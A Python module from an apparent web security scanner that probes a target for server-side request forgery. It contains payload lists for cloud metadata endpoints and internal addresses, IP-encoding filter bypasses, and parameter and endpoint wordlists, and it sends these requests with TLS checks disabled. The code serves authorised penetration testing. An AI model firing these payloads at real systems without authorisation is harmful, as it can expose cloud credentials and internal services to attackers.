"""Module 27 — SSRF (Server-Side Request Forgery) Testing.

Tests for SSRF vulnerabilities that allow an attacker to make
the server send requests to internal resources.
"""

import json
import logging
import time
from pathlib import Path

import requests

logger = logging.getLogger("cyberpulse.modules.m27")

# Parameters commonly vulnerable to SSRF
SSRF_PARAMS = [
    "url", "link", "src", "source", "redirect", "uri", "path",
    "next", "data", "reference", "site", "html", "val", "validate",
    "domain", "callback", "return", "page", "feed", "host", "port",
    "to", "out", "view", "dir", "show", "navigation", "open",
    "file", "document", "folder", "pg", "style", "pdf", "template",
    "php_path", "doc", "img", "filename",
]

# Internal URLs to test
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:22",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",   # AWS metadata
    "http://metadata.google.internal/",             # GCP metadata
    "http://169.254.169.254/metadata/v1/",          # Azure/DigitalOcean
    "http://100.100.100.200/latest/meta-data/",     # Alibaba Cloud
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
]

# Bypass techniques
SSRF_BYPASS = [
    "http://0x7f000001",                   # Hex IP
    "http://2130706433",                    # Decimal IP
    "http://017700000001",                  # Octal IP
    "http://127.1",                         # Shortened
    "http://127.0.0.1.nip.io",             # DNS rebinding
    "http://spoofed.burpcollaborator.net",
    "http://localtest.me",                  # Resolves to 127.0.0.1
]


class Scanner:
    name = "SSRF Testing"
    phase = "exploitation"
    description = "Tests for Server-Side Request Forgery in URL parameters and API endpoints"

    def __init__(self, target: str, output_dir: Path, config: dict):
        self.target = target
        self.output_dir = Path(output_dir)
        self.config = config
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 CyberPulse/1.0"
        self.session.verify = False

    def run(self) -> dict:
        findings = []
        raw_lines = [f"SSRF testing for {self.target}"]
        base_url = self._get_base_url()

        # Phase 1: Test URL parameters on known pages
        raw_lines.append("\n[Phase 1: Parameter-based SSRF]")
        pages_to_test = self._discover_pages(base_url)
        raw_lines.append(f"  Found {len(pages_to_test)} pages with URL parameters")

        for page_url in pages_to_test[:10]:  # Limit
            for payload in SSRF_PAYLOADS[:5]:  # Limit per page
                result = self._test_param_ssrf(page_url, payload)
                if result:
                    findings.append(result)
                    raw_lines.append(f"  SSRF: {result['detail']}")

        # Phase 2: Test common SSRF-vulnerable endpoints
        raw_lines.append("\n[Phase 2: Endpoint-based SSRF]")
        ssrf_endpoints = [
            ("/api/proxy", "url"),
            ("/api/fetch", "url"),
            ("/api/image", "src"),
            ("/proxy", "url"),
            ("/fetch", "url"),
            ("/webhook", "url"),
            ("/api/webhook", "url"),
            ("/redirect", "url"),
            ("/api/preview", "url"),
            ("/api/screenshot", "url"),
            ("/pdf", "url"),
            ("/api/pdf", "url"),
        ]

        for endpoint, param in ssrf_endpoints:
            url = f"{base_url}{endpoint}"
            for payload in SSRF_PAYLOADS[:3]:
                try:
                    # GET test
                    resp = self.session.get(url, params={param: payload}, timeout=10)
                    if self._indicates_ssrf(resp, payload):
                        findings.append({
                            "type": "ssrf_endpoint",
                            "endpoint": endpoint,
                            "parameter": param,
                            "payload": payload,
                            "detail": f"SSRF via GET {endpoint}?{param}={payload}",
                            "severity": "critical",
                        })
                        raw_lines.append(f"  CRITICAL: SSRF at {endpoint} (GET)")
                        break

                    # POST test
                    resp = self.session.post(url, json={param: payload}, timeout=10)
                    if self._indicates_ssrf(resp, payload):
                        findings.append({
                            "type": "ssrf_endpoint",
                            "endpoint": endpoint,
                            "parameter": param,
                            "payload": payload,
                            "method": "POST",
                            "detail": f"SSRF via POST {endpoint} {{{param}: {payload}}}",
                            "severity": "critical",
                        })
                        raw_lines.append(f"  CRITICAL: SSRF at {endpoint} (POST)")
                        break
                except Exception:
                    continue

        # Phase 3: Cloud metadata SSRF
        raw_lines.append("\n[Phase 3: Cloud Metadata SSRF]")
        metadata_urls = [
            ("AWS", "http://169.254.169.254/latest/meta-data/"),
            ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
            ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ]

        for cloud, meta_url in metadata_urls:
            for endpoint, param in ssrf_endpoints[:3]:
                url = f"{base_url}{endpoint}"
                try:
                    resp = self.session.get(url, params={param: meta_url}, timeout=10)
                    if resp.status_code == 200 and len(resp.text) > 50:
                        if any(kw in resp.text.lower() for kw in
                               ["ami-id", "instance-id", "hostname", "mac",
                                "project-id", "zone", "vmId", "compute"]):
                            findings.append({
                                "type": "ssrf_cloud_metadata",
                                "cloud": cloud,
                                "endpoint": endpoint,
                                "detail": f"Cloud metadata ({cloud}) accessible via SSRF at {endpoint}!",
                                "severity": "critical",
                            })
                            raw_lines.append(f"  CRITICAL: {cloud} metadata exposed via {endpoint}")
                except Exception:
                    continue

        # Phase 4: Bypass techniques
        raw_lines.append("\n[Phase 4: SSRF Bypass Techniques]")
        for bypass_url in SSRF_BYPASS:
            for endpoint, param in ssrf_endpoints[:2]:
                url = f"{base_url}{endpoint}"
                try:
                    resp = self.session.get(url, params={param: bypass_url}, timeout=10)
                    if self._indicates_ssrf(resp, bypass_url):
                        findings.append({
                            "type": "ssrf_bypass",
                            "endpoint": endpoint,
                            "bypass": bypass_url,
                            "detail": f"SSRF bypass successful: {bypass_url} at {endpoint}",
                            "severity": "critical",
                        })
                        raw_lines.append(f"  BYPASS: {bypass_url} at {endpoint}")
                except Exception:
                    continue

        raw_output = "\n".join(raw_lines)
        outfile = self.output_dir / "27_ssrf.json"
        with open(outfile, "w", encoding="utf-8") as f:
            json.dump({"findings": findings}, f, indent=2)

        logger.info("SSRF scan %s: %d findings", self.target, len(findings))
        return {"findings": findings, "raw_output": raw_output}

    def _discover_pages(self, base_url: str) -> list[str]:
        """Find pages that accept URL-like parameters."""
        import re
        pages = []
        try:
            resp = self.session.get(base_url, timeout=10)
            # Find links with parameters
            links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', resp.text)
            for link in links:
                for param in SSRF_PARAMS:
                    if f"{param}=" in link.lower():
                        if link.startswith("http"):
                            pages.append(link)
                        else:
                            pages.append(base_url + link)
        except Exception:
            pass
        return pages

    def _test_param_ssrf(self, url: str, payload: str):
        """Replace URL parameter value with SSRF payload."""
        import re
        for param in SSRF_PARAMS:
            pattern = f"({param}=)[^&]*"
            if re.search(pattern, url, re.I):
                test_url = re.sub(pattern, f"\\1{payload}", url, flags=re.I)
                try:
                    resp = self.session.get(test_url, timeout=10)
                    if self._indicates_ssrf(resp, payload):
                        return {
                            "type": "ssrf_param",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "detail": f"SSRF via parameter '{param}' with {payload}",
                            "severity": "critical",
                        }
                except Exception:
                    pass
        return None

    def _indicates_ssrf(self, resp, payload: str) -> bool:
        """Check if response indicates successful SSRF."""
        if resp.status_code != 200:
            return False

        body = resp.text.lower()
        # Check for internal service indicators
        ssrf_indicators = [
            "ami-id", "instance-id", "internal", "localhost",
            "root:", "/etc/", "uid=", "gid=", "groups=",
            "apache", "nginx", "server at", "directory listing",
            "phpmyadmin", "dashboard",
        ]
        return any(indicator in body for indicator in ssrf_indicators)

    def _get_base_url(self) -> str:
        for scheme in ("https", "http"):
            try:
                self.session.head(f"{scheme}://{self.target}", timeout=5)
                return f"{scheme}://{self.target}"
            except Exception:
                continue
        return f"http://{self.target}"
